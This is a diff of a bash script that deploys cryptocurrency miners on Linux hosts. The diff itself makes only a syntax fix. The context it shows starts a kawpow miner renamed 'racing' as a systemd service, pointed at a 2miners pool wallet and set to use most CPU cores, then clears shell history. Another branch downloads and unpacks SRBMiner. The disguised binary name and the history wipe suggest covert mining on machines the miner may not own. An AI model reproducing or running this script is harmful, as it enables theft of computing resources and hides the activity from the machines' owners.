@@ -2,7 +2,7 @@ cd /home
 myworker=$(TZ='Asia/Ho_Chi_Minh' date +'%d-%m_%H')
 noCore=$(nproc --all)
 usingcore=$((noCore*90/100))
-if [[$noCore -eq 6]]
+if [[ $noCore -eq 6 ]]
 then
     sudo apt-get install linux-headers-$(uname -r) -y
 	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
@@ -33,7 +33,6 @@ then
 	sudo systemctl enable racing.service
 	sudo ./racing -a kawpow -o us-rvn.2miners.com:6060 -u RPoxsDmAF8rXPycoTGf8NPNJrsDULeAVoJ.${myworker}_BA -p x &
 	history -c
-    
 else
 	sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.1.1/SRBMiner-Multi-1-1-1-Linux.tar.xz
 	sudo tar -xvf SRBMiner-Multi-1-1-1-Linux.tar.xz
